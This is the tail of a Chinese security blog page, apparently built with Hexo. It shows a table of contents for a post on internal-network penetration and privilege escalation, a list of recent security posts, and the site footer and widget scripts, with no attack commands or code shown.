class="toc-text">(四)、计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94-%E3%80%81%E9%80%9A%E8%BF%87%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8"><span class="toc-number">3.5.</span> <span class="toc-text">(五)、通过环境变量植入后门</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.</span> <span class="toc-text">四、主机信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80-%E3%80%81%E6%9F%A5%E8%AF%A2%E8%B4%A6%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">4.1.</span> <span class="toc-text">(一)、查询账户信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C-%E3%80%81%E6%9F%A5%E8%AF%A2%E7%BD%91%E7%BB%9C%E5%92%8C%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">4.2.</span> <span class="toc-text">(二)、查询网络和端口信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89-%E3%80%81%E6%9F%A5%E8%AF%A2%E8%BF%9B%E7%A8%8B%E5%88%97%E8%A1%A8"><span class="toc-number">4.3.</span> <span class="toc-text">(三)、查询进程列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B-%E3%80%81%E6%9F%A5%E8%AF%A2%E7%B3%BB%E7%BB%9F%E5%92%8C%E8%A1%A5%E4%B8%81%E4%BF%A1%E6%81%AF"><span class="toc-number">4.4.</span> <span class="toc-text">(四)、查询系统和补丁信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94-%E3%80%81%E5%87%AD%E8%AF%81%E6%94%B6%E5%8F%96"><span class="toc-number">4.5.</span> <span class="toc-text">(五)、凭证收取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">五、提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80-%E3%80%81%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">5.1.</span> <span class="toc-text">(一)、内核漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">5.1.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%BC%94%E7%A4%BA"><span class="toc-number">5.1.2.</span> <span class="toc-text">实战演示</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C-%E3%80%81SUID%E6%8F%90%E6%9D%83"><span class="toc-number">5.2.</span> <span class="toc-text">(二)、SUID提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89-%E3%80%81Sudo%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">5.3.</span> <span class="toc-text">(三)、Sudo配置错误</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">6.</span> <span class="toc-text">六、横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80-%E3%80%81CVE-2020-1472"><span class="toc-number">6.1.</span> <span class="toc-text">(一)、CVE-2020-1472</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%89%A9%E5%A4%A7%E6%88%98%E6%9E%9C"><span class="toc-number">7.</span> <span class="toc-text">七、扩大战果</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/12/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B3%9B%E5%BE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%B0%E5%8F%91%E7%8E%B0%E6%9C%AA%E5%85%AC%E5%BC%80%E6%96%B0%E6%BC%8F%E6%B4%9E/" title="记一次泛微漏洞分析到发现未公开新漏洞"><img src="/images/neiwang.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次泛微漏洞分析到发现未公开新漏洞"/></a><div class="content"><a class="title" href="/2021/12/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B3%9B%E5%BE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%B0%E5%8F%91%E7%8E%B0%E6%9C%AA%E5%85%AC%E5%BC%80%E6%96%B0%E6%BC%8F%E6%B4%9E/" title="记一次泛微漏洞分析到发现未公开新漏洞">记一次泛微漏洞分析到发现未公开新漏洞</a><time datetime="2021-12-28T02:45:41.000Z" title="发表于 2021-12-28 10:45:41">2021-12-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/19/%E5%AE%9E%E6%88%98xray+burp%E6%8C%96%E6%8E%98%E9%80%9A%E7%94%A8%E5%9E%8B%E6%BC%8F%E6%B4%9E/" title="实战xray+burp挖掘通用型漏洞"><img src="/images/src_wajue.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="实战xray+burp挖掘通用型漏洞"/></a><div class="content"><a class="title" href="/2021/12/19/%E5%AE%9E%E6%88%98xray+burp%E6%8C%96%E6%8E%98%E9%80%9A%E7%94%A8%E5%9E%8B%E6%BC%8F%E6%B4%9E/" title="实战xray+burp挖掘通用型漏洞">实战xray+burp挖掘通用型漏洞</a><time datetime="2021-12-19T02:45:41.000Z" title="发表于 2021-12-19 10:45:41">2021-12-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%9D%E6%8E%A2(%E4%B8%89)%EF%BD%9C%E5%B7%AE%E7%BC%BA%E8%A1%A5%E6%BC%8F/" title="内网渗透初探(三)｜差缺补漏"><img src="/images/neiwang.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透初探(三)｜差缺补漏"/></a><div class="content"><a class="title" href="/2021/12/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%9D%E6%8E%A2(%E4%B8%89)%EF%BD%9C%E5%B7%AE%E7%BC%BA%E8%A1%A5%E6%BC%8F/" title="内网渗透初探(三)｜差缺补漏">内网渗透初探(三)｜差缺补漏</a><time datetime="2021-12-11T02:45:41.000Z" title="发表于 2021-12-11 10:45:41">2021-12-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/28/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BD%9CCVE-2021-43798%20-%20Grafana%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" title="漏洞分析｜CVE-2021-43798 - Grafana文件读取漏洞"><img src="https://img0.baidu.com/it/u=4294281519,3704037899&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=952&amp;h=500" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="漏洞分析｜CVE-2021-43798 - Grafana文件读取漏洞"/></a><div class="content"><a class="title" href="/2021/11/28/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BD%9CCVE-2021-43798%20-%20Grafana%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" title="漏洞分析｜CVE-2021-43798 - Grafana文件读取漏洞">漏洞分析｜CVE-2021-43798 - Grafana文件读取漏洞</a><time datetime="2021-11-28T02:45:41.000Z" title="发表于 2021-11-28 10:45:41">2021-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%9D%E6%8E%A2(%E4%BA%8C)/" title="内网渗透初探(二)"><img src="/images/neiwang.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透初探(二)"/></a><div class="content"><a class="title" href="/2021/11/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%9D%E6%8E%A2(%E4%BA%8C)/" title="内网渗透初探(二)">内网渗透初探(二)</a><time datetime="2021-11-22T02:45:41.000Z" title="发表于 2021-11-22 10:45:41">2021-11-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022  <i id="heartbeat" class="fa fas fa-heartbeat"></i> jasson</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><p><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://www.jsdelivr.com/"><img src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用 Jsdelivr 为静态资源提供CDN加速" alt="Jsdelivr"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px"target="_blank"href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'ezr37wKgCkQA0GoJHntOvgbB-MdYXbMMI',
      appKey: '7waFMOWmYb026lMWzexxu7RF',
      placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      path: window.location.pathname,
      requiredFields: ["nick,mail"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script defer src="/live2d-widget/autoload.js"></script><script defer src="/js/phone.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="true" data-text="富强,明主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>